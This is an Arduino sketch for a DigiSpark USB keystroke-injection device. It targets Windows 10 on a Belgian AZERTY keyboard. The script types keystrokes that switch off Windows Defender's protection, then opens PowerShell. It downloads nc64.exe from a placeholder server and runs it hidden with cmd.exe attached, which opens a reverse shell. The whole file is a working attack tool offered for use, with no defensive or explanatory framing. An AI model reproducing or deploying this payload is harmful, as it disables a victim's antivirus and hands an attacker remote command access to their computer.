#include <DigiKeyboardFr.h>
/*
 * DigiSpark card URL: http://digistump.com/package_digistump_index.json
 * Tested on:
 * Belgian AZERTY French Keyboard
 * Microsoft Windows 10 Professionnel - 10.0.19042 N/A Build 19042
 * Microsoft Windows 10 Home          - 10.0.19042 N/A Build 19042
 * 
 */
//This DigiSpark script turns off windows defender in windows10
void setup() {
  
   //Turn off Windows Defender
  DigiKeyboardFr.delay(3000); // To make USB device ready to communicate
  pinMode(1, OUTPUT); //LED on Model A
  digitalWrite(1, HIGH);
  DigiKeyboardFr.sendKeyStroke(KEY_M, MOD_GUI_LEFT); //minimize all windows
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.sendKeyStroke(0, MOD_GUI_LEFT);//open windows start
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.print("Windows Secu"); //type windows defender
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(3000);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(2000);
  DigiKeyboardFr.print("\t");//Press TAB 1
  DigiKeyboardFr.delay(250);
  DigiKeyboardFr.print("\t");//Press TAB 2
  DigiKeyboardFr.delay(250);
  DigiKeyboardFr.print("\t");//Press TAB 3
  DigiKeyboardFr.delay(250);
  DigiKeyboardFr.print("\t");//Press TAB 4
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(1500);
  DigiKeyboardFr.sendKeyStroke(KEY_SPACE);
  DigiKeyboardFr.delay(1500);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(250);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(2000);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(100);
  DigiKeyboardFr.println("powershell");
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(100);
  DigiKeyboardFr.println("wget http://yourserver/nc64.exe =outfile 'hello.exe'"); // I used = instead of - beceause I have a Belgian Keyboard and not a French one
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.println("powershell =WindowStyle hidden ./hello.exe =nv yourserver PORT =e cmd.exe"); 
  DigiKeyboardFr.delay(250);
  DigiKeyboardFr.sendKeyStroke(43, MOD_ALT_LEFT); //change window
  DigiKeyboardFr.delay(250);
  DigiKeyboardFr.sendKeyStroke(KEY_SPACE);
  DigiKeyboardFr.delay(250);
  DigiKeyboardFr.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); //close window  
  digitalWrite(1, LOW); // END OF OPERATION

}
void loop(){

  }
